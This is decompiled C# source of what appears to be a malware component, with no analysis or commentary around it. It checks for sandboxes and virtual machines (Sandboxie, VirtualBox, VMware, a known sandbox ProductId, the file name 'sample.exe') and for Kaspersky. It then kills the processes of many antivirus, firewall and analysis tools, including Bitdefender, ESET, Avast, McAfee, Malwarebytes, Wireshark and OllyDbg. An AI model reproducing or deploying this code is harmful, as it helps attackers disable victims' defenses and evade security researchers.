using System;
using System.Collections;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

[StandardModule]
internal sealed class Class9
{
	private static object object_0;

	private static string string_0;

	private static string string_1;

	private static RegistryKey registryKey_0;

	private static object object_1;

	private static string string_2;

	static Class9()
	{
		Class14.u5Gt82DzXHpxk();
		string_1 = "SELECT * FROM Win32_VideoController";
		registryKey_0 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microso ft\\Windows NT\\CurrentVersion", writable: false);
		object_1 = RuntimeHelpers.GetObjectValue(registryKey_0.GetValue("ProductId"));
		string_2 = "76487-337-8429955-22614";
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static bool smethod_0()
	{
		int try0001_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num2 = 2;
					flag = Process.GetProcessesByName("avp").Length >= 1;
					goto end_IL_0001;
				case 43:
					num = -1;
					switch (num2)
					{
					case 2:
						ProjectData.EndApp();
						goto end_IL_0001;
					}
					break;
				}
				goto IL_0061;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 43;
				continue;
			}
			break;
			IL_0061:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static bool smethod_1()
	{
		int try0001_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num2 = 2;
					flag = Process.GetProcessesByName("SbieSvc").Length >= 1;
					goto end_IL_0001;
				case 43:
					num = -1;
					switch (num2)
					{
					case 2:
						ProjectData.EndApp();
						goto end_IL_0001;
					}
					break;
				}
				goto IL_0061;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 43;
				continue;
			}
			break;
			IL_0061:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static bool smethod_2()
	{
		int try0001_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					string startupPath = Application.get_StartupPath();
					string text = startupPath + "\\sample.exe";
					flag = ((Operators.CompareString(Application.get_ExecutablePath(), text, false) == 0) ? true : false);
					goto end_IL_0001;
				}
				case 51:
					num = -1;
					switch (num2)
					{
					case 2:
						ProjectData.EndApp();
						goto end_IL_0001;
					}
					break;
				}
				goto IL_0072;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 51;
				continue;
			}
			break;
			IL_0072:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static bool smethod_3()
	{
		int try0001_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num2 = 2;
					flag = (Operators.ConditionalCompareObjectEqual(object_1, (object)string_2, false) ? true : false);
					goto end_IL_0001;
				case 34:
					num = -1;
					switch (num2)
					{
					case 2:
						ProjectData.EndApp();
						goto end_IL_0001;
					}
					break;
				}
				goto IL_005f;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 34;
				continue;
			}
			break;
			IL_005f:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static bool smethod_4()
	{
		int try0001_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					smethod_21();
					string text = string_0;
					flag = ((Operators.CompareString(text, "VirtualBox Graphics Adapter", false) == 0) ? true : false);
					goto end_IL_0001;
				}
				case 51:
					num = -1;
					switch (num2)
					{
					case 2:
						ProjectData.EndApp();
						goto end_IL_0001;
					}
					break;
				}
				goto IL_0069;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 51;
				continue;
			}
			break;
			IL_0069:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static bool smethod_5()
	{
		int try0001_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					smethod_21();
					string text = string_0;
					flag = ((Operators.CompareString(text, "VMware SVGA II", false) == 0) ? true : false);
					goto end_IL_0001;
				}
				case 44:
					num = -1;
					switch (num2)
					{
					case 2:
						ProjectData.EndApp();
						goto end_IL_0001;
					}
					break;
				}
				goto IL_0069;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 44;
				continue;
			}
			break;
			IL_0069:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static bool smethod_6()
	{
		int try0001_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					smethod_21();
					string text = string_0;
					flag = ((Operators.CompareString(text, "VM Additions S3 Trio32/64", false) == 0) ? true : false);
					goto end_IL_0001;
				}
				case 51:
					num = -1;
					switch (num2)
					{
					case 2:
						ProjectData.EndApp();
						goto end_IL_0001;
					}
					break;
				}
				goto IL_0069;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 51;
				continue;
			}
			break;
			IL_0069:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static void smethod_7()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "bdagent", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public static void smethod_8()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "zlclient", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public static void smethod_9()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "egui", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public static void smethod_10()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "ashWebSv.exe", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public static void smethod_11()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "avgemc.exe", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public static void smethod_12()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "mcagentmcuimgr", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public static void smethod_13()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "clamauto.exe", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public static void smethod_14()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "cpf.exe", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public static void smethod_15()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "keyscrambler", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public static void smethod_16()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "wireshark", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public static void pbsHoiOmG()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "avp", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public static void smethod_17()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "mbam", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public static void smethod_18()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "ollydbg", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public static void smethod_19()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "outpost", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public static void smethod_20()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "npfmsg", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private static void smethod_21()
	{
		int try0001_dispatch = -1;
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					object @object = Interaction.GetObject("winmgmts:", (string)null);
					object[] array = new object[1] { string_1 };
					bool[] array2 = new bool[1] { true };
					object obj = NewLateBinding.LateGet(@object, (Type)null, "ExecQuery", array, (string[])null, (Type[])null, array2);
					if (array2[0])
					{
						string_1 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
					}
					object_0 = RuntimeHelpers.GetObjectValue(obj);
					IEnumerator enumerator = ((IEnumerable)object_0).GetEnumerator();
					while (enumerator.MoveNext())
					{
						object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
						string_0 = Conversions.ToString(NewLateBinding.LateGet(objectValue, (Type)null, "Description", new object[0], (string[])null, (Type[])null, (bool[])null));
					}
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
					goto end_IL_0001;
				}
				case 214:
					num = -1;
					switch (num2)
					{
					case 2:
						ProjectData.EndApp();
						goto end_IL_0001;
					}
					break;
				}
				goto IL_0115;
				end_IL_0001:;
			}
			catch (object obj2) when (obj2 is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj2);
				try0001_dispatch = 214;
				continue;
			}
			break;
			IL_0115:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
